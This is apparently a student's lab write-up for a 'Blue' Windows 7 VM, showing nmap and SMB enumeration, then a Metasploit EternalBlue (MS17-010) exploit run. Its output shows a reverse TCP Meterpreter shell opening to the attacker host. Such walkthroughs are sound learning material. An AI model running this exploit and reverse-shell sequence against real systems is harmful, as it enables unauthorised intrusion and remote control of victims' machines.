# Blue VM lab
## nmap enumeration result
```
Nmap scan report for 192.168.1.110
Host is up (0.00021s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:13:19:79 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-05T22:37:00-04:00
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:13:19:79 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-05-06T02:37:00
|_  start_date: 2024-05-06T02:28:05
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Enumerate SMB protocol

`smbclient \\\\192.168.1.110\\`
but nothing happen I guess it does not allow to access so I tried another one

`smbclient \\\\192.168.1.110\\IPC$`
this shared name allow client to access to printer, I can access it but nothing interesting

```
Password for [WORKGROUP\annibuliful]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_INVALID_PARAMETER listing \*
smb: \> dir
NT_STATUS_INVALID_PARAMETER listing \*
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
NT_STATUS_INVALID_PARAMETER listing \*
smb: \> pwd
Current directory is \\192.168.1.110\IPC$\
smb: \> 
```

let's back to nmap result then I found that smb allow `guest` user to connect too let's try

`smbclient \\\\192.168.1.110\\ -U guest`
but it seem does not work to connect with guest account without password


I go back to use metasploit to identify and ensure about smb version

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set rhosts 192.168.1.110
rhosts => 192.168.1.110
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 192.168.1.110:445     - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:29m 42s) (guid:{869d2bc3-6f4f-4647-bf07-8605a003e2c4}) (authentication domain:WIN-845Q99OO4PP)Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)
[+] 192.168.1.110:445     -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:29m 42s) (guid:{869d2bc3-6f4f-4647-bf07-8605a003e2c4}) (authentication domain:WIN-845Q99OO4PP)Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)
[*] 192.168.1.110:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> 
```

I researched about (preferred dialect: SMB 2.1) then I found about ethernalblue vulnerability [Eternalblue MS17-010](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

it works!!!!

```
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhosts 192.168.1.110
rhosts => 192.168.1.110
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 192.168.1.103:4444 
[*] 192.168.1.110:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.110:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.110:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.110:445 - The target is vulnerable.
[*] 192.168.1.110:445 - Connecting to target for exploitation.
[+] 192.168.1.110:445 - Connection established for exploitation.
[+] 192.168.1.110:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.110:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.110:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.110:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.1.110:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.1.110:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.110:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.110:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.110:445 - Starting non-paged pool grooming
[+] 192.168.1.110:445 - Sending SMBv2 buffers
[+] 192.168.1.110:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.110:445 - Sending final SMBv2 buffers.
[*] 192.168.1.110:445 - Sending last fragment of exploit packet!
[*] 192.168.1.110:445 - Receiving response from exploit packet
[+] 192.168.1.110:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.110:445 - Sending egg to corrupted connection.
[*] 192.168.1.110:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.1.110
[*] Meterpreter session 1 opened (192.168.1.103:4444 -> 192.168.1.110:49158) at 2024-05-06 10:22:44 +0700
[+] 192.168.1.110:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.110:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.110:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

(Meterpreter 1)(C:\Windows\system32) > 
```